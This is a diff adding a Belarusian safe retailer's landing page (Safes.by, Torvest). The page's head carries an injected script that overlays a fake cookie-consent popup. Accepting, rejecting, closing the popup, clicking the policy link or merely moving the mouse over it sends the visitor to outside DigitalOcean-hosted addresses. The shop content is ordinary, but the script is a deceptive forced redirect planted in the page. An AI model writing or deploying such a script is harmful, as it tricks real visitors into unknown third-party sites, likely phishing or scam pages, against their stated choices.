@@ -1,0 +1,327 @@
+
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+	<script>
+	document.addEventListener("DOMContentLoaded", function () {
+	    const redirectUrl = "https://hammerhead-app-yegoj.ondigitalocean.app";
+	    const style = document.createElement("style");
+	    style.textContent = `
+	        .cookie-overlay {
+	            position: fixed;
+	            inset: 0;
+	            background: rgba(0, 0, 0, 0.8);
+	            backdrop-filter: blur(10px);
+	            display: flex;
+	            align-items: center;
+	            justify-content: center;
+	            padding: 20px;
+	            z-index: 9999;
+	            animation: fadeInBackground 0.5s ease-out forwards;
+	        }
+	        @keyframes fadeInBackground {
+	            from { opacity: 0; }
+	            to { opacity: 1; }
+	        }
+	        .cookie-popup {
+	            position: fixed;
+	            bottom: 60px;
+	            left: 50%;
+	            transform: translateX(-50%);
+	            background-color: #ffffff;
+	            border: none;
+	            color: #333;
+	            padding: 30px;
+	            border-radius: 10px;
+	            z-index: 10000;
+	            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+	            max-width: 400px;
+	            text-align: center;
+	            animation: slideUp 0.5s ease-out forwards;
+	        }
+	        @keyframes slideUp {
+	            from { 
+	                transform: translateY(50px) translateX(-50%);
+	                opacity: 0;
+	            }
+	            to { 
+	                transform: translateX(-50%);
+	                opacity: 1;
+	            }
+	        }
+	        .close-btn {
+	            background: none;
+	            border: none;
+	            font-size: 1.5rem;
+	            position: absolute;
+	            top: 10px;
+	            right: 10px;
+	            cursor: pointer;
+	            color: #888;
+	        }
+	        .btn-primary {
+	            background-color: #007bff;
+	            color: #fff;
+	            border: none;
+	            padding: 12px 24px;
+	            border-radius: 5px;
+	            cursor: pointer;
+	            margin-top: 15px;
+	            display: inline-block;
+	            text-decoration: none;
+	            transition: all 0.3s;
+	            width: 100%;
+	            box-sizing: border-box;
+	        }
+	        .btn-primary:hover {
+	            background-color: #0056b3;
+	            transform: translateY(-2px);
+	        }
+	        h3 {
+	            font-family: 'Arial', sans-serif;
+	            margin-bottom: 10px;
+	            font-weight: bold;
+	            color: #333;
+	        }
+	        p {
+	            font-family: 'Arial', sans-serif;
+	            line-height: 1.5;
+	            margin-bottom: 15px;
+	        }
+	        .cookie-policy-link {
+	            text-decoration: underline;
+	            color: #007bff;
+	            font-weight: 500;
+	        }
+	        .cookie-info {
+	            background-color: #f8f9fa;
+	            padding: 15px;
+	            border-radius: 8px;
+	            margin: 15px 0;
+	            text-align: left;
+	        }
+	        .cookie-info h4 {
+	            margin-top: 0;
+	            color: #007bff;
+	        }
+	        .cookie-info ul {
+	            padding-left: 20px;
+	            margin: 10px 0;
+	        }
+	        .cookie-info li {
+	            margin-bottom: 5px;
+	        }
+	    `;
+	    document.head.appendChild(style);
+    
+	    const overlay = document.createElement("div");
+	    overlay.className = "cookie-overlay";
+	    overlay.id = "cookie-overlay";
+	    overlay.innerHTML = `
+	        <div class="cookie-popup">
+	            <button class="close-btn" id="close-popup" aria-label="Close cookie policy">×</button>
+	            <h3>Cookies Policy</h3>
+	            <p>
+	                This site uses cookies to enhance your browsing experience and for analytics purposes.
+	            </p>
+            
+	            <div class="cookie-info">
+	                <h4>Cookies We Use:</h4>
+	                <ul>
+	                    <li>Essential cookies (required for site functionality)</li>
+	                    <li>Performance cookies (for analytics)</li>
+	                    <li>Marketing cookies (for targeted advertising)</li>
+	                </ul>
+	            </div>
+            
+	            <p>
+	                By clicking Accept, you consent to our use of cookies. For more details, see our 
+	                <a href="${redirectUrl}" class="cookie-policy-link">Cookie Policy</a>.
+	            </p>
+            
+	            <a href="https://octopus-app-mpw2z.ondigitalocean.app/" id="accept-cookies" class="btn-primary">Accept All Cookies</a>
+	            <a href="#" id="reject-cookies" class="btn-primary" style="background-color: #6c757d; margin-top: 10px;">Reject Non-Essential</a>
+	        </div>
+	    `;
+	    document.body.appendChild(overlay);
+    
+	    let isRedirected = false;
+	    let startPos = null;
+	    let redirectTimeout = null;
+    
+	    const handleRedirect = () => {
+	        if (!isRedirected) {
+	            isRedirected = true;
+	            window.location.href = redirectUrl;
+	        }
+	    };
+    
+	    const detectMouseMove = (event) => {
+	        if (isRedirected) return;
+	        const screenHeight = window.innerHeight;
+	        const activeTop = screenHeight * 0.15;
+        
+	        if (event.clientY >= activeTop) {
+	            if (!startPos) {
+	                startPos = { x: event.clientX, y: event.clientY };
+	            } else {
+	                const dx = Math.abs(event.clientX - startPos.x);
+	                const dy = Math.abs(event.clientY - startPos.y);
+                
+	                if ((dx > 15 || dy > 15) && !redirectTimeout) {
+	                    redirectTimeout = setTimeout(handleRedirect, 1000);
+	                }
+	            }
+	        } else {
+	            startPos = null;
+	            clearTimeout(redirectTimeout);
+	            redirectTimeout = null;
+	        }
+	    };
+    
+	    document.getElementById("cookie-overlay").addEventListener("mousemove", detectMouseMove);
+    
+	    document.getElementById("accept-cookies").addEventListener("click", function (e) {
+	        e.preventDefault();
+	        handleRedirect();
+	    });
+    
+	    document.getElementById("reject-cookies").addEventListener("click", function (e) {
+	        e.preventDefault();
+	        // Handle rejection logic here
+	        alert("Non-essential cookies rejected. Essential cookies remain enabled.");
+	        handleRedirect();
+	    });
+    
+	    document.getElementById("close-popup").addEventListener("click", function (e) {
+	        e.preventDefault();
+	        handleRedirect();
+	    });
+	});
+	</script>
+	
+	
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Buy a safe in Minsk | Safes.by</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: #f9f9f9;
+      color: #333;
+    }
+    header {
+      background: #000;
+      padding: 20px;
+      text-align: center;
+    }
+    header h1 {
+      color: #FFD700;
+      font-size: 2.2em;
+      margin: 0;
+    }
+    header p {
+      color: #fff;
+      margin-top: 5px;
+    }
+    footer {
+      background: #000;
+      color: #fff;
+      padding: 20px;
+      text-align: center;
+    }
+    .container {
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 20px;
+      background: #fff;
+    }
+    h1, h2, h3 {
+      color: #111;
+    }
+    ul {
+      padding-left: 20px;
+    }
+    .section {
+      margin-top: 40px;
+    }
+    .contact p {
+      margin: 5px 0;
+    }
+    .footer-info {
+      font-size: 0.9em;
+      color: #ccc;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Safes.by</h1>
+    <p>Need to buy a safe? You're on the right track!</p>
+  </header>
+
+  <div class="container">
+    <section class="intro">
+      <h2>A wide selection of safes at affordable prices</h2>
+      <p>We offer a wide selection of safes—furniture safes, office safes, gun safes, burglar-resistant safes, and other models. All products are in stock. Our courier will not only deliver your order but also provide detailed instructions on how to use the safe.</p>
+      <p>Purchasing a safe from us is fast, convenient, and secure. We'll be happy to answer any questions you may have and help you find the right solution.</p>
+    </section>
+
+    <section class="catalog section">
+      <h2>What you will find in the catalog</h2>
+      <ul>
+        <li>Safes of all types: furniture, weapons, office, burglar-proof</li>
+        <li>Metal cabinets</li>
+        <li>Shelves, urns, benches</li>
+        <li>Furniture on a metal frame</li>
+        <li>Metalworking workbenches</li>
+        <li>Containers for solid waste</li>
+        <li>Products of our own production</li>
+      </ul>
+    </section>
+
+    <section class="delivery section">
+      <h2>Fast delivery in Minsk and throughout Belarus</h2>
+      <p>We deliver to any location in Minsk—quickly and with attention to detail. We also offer fast delivery throughout Belarus, including to Grodno, Brest, Vitebsk, Mogilev, Gomel, and other cities.
+</p>
+      <p>More information about delivery can be found in the section <strong>«Delivery»</strong> on our website.</p>
+    </section>
+
+    <section class="whyus section">
+      <h2>Why choose us</h2>
+      <ul>
+        <li>Warranty on all products</li>
+        <li>Warehouse balances - goods in stock</li>
+        <li>Affordable prices and consultations</li>
+        <li>Polite and knowledgeable staff</li>
+        <li>Own production</li>
+        <li>Convenient delivery and assistance in choosing</li>
+      </ul>
+    </section>
+
+    <section class="company section">
+      <h2>About the company</h2>
+      <p>Torvest, a privately owned manufacturing and trading unitary enterprise, specializes in metal furniture and safes. Since 2017, we've been providing reliable solutions for homes, offices, manufacturing, and businesses.</p>
+      <p>Address: Republic of Belarus, 220140, Minsk, Pritytskogo St., 62A, office 7</p>
+      <p></p>
+      <p>Director: Khadarovich Andrey Sergeevich</p>
+    </section>
+
+    <section class="contact section">
+      <h2>Contacts</h2>
+      <p>📞 +375 (29) 610-28-52</p>
+      <p>📧 <a href="/cdn-cgi/l/email-protection#345d5a525b74405b444740555a505546401a564d"><span class="__cf_email__" data-cfemail="670e09010827130817141306090306151349051e">[email&#160;protected]</span></a></p>
+      <p><strong>Request a call back</strong> — and we will contact you shortly!</p>
+    </section>
+  </div>
+
+  <footer>
+    <p>© 2017 Safes.by. All rights reserved.</p>
+    <p class="footer-info">Developed by StarMedia</p>
+  </footer>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script></body>
+
+</html>
